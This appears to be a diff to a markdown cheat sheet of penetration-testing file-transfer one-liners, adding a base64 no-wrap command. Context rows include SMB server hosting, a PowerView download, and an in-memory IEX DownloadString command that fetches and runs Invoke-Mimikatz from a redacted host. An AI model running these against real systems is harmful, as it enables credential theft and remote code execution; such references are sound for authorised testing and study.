@@ -3,6 +3,7 @@
 | **Command**                                                                                                                     | **Description**                                       |
 | ------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------- |
 | `python3 -m http.server <port>`<br>or<br>`python -m SimpleHTTPServer <port>`<br>                                                | Host HTTP Server one-liner                            |
+| `base64 -w 0 /path/to/file`                                                                                                     | Linux base64 /nowrap equivalent                       |
 | `sudo impacket-smbserver -smb2support <SHARENAME> /home/kali/directory`                                                         | Host SMB server one-liner                             |
 | `Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1`                                                         | Download a file with PowerShell                       |
 | `IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')`                                           | Execute a file in memory using PowerShell             |
